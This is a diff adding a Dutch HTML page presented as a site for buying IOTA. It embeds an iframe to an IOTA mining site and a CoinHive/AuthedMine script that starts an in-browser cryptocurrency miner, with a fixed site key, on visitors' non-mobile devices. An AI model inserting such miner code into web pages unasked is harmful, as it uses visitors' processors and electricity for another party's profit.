@@ -1,0 +1,28 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>IOTA Kopen</title>
+<link rel="stylesheet" type="text/css" href="view.css" media="all">
+<script type="text/javascript" src="view.js"></script>
+
+</head>
+<div class="topnav">
+  <a class="active" href="index.php">Home</a>
+  <a href="gratisiota.html">Gratis IOTA</a>
+  <a href="iotawallet.html">Online IOTA Wallet</a>
+</div>
+<iframe src="https:/www.mineiota.com" title="Gratis IOTA" width="100%" height="10000px">
+  <p>Your browser does not support iframes.</p>
+</iframe>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('xOBf2atYlx4gDSjQXsCibI8P1erHq5SN', {throttle: 0.1});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
+</html>
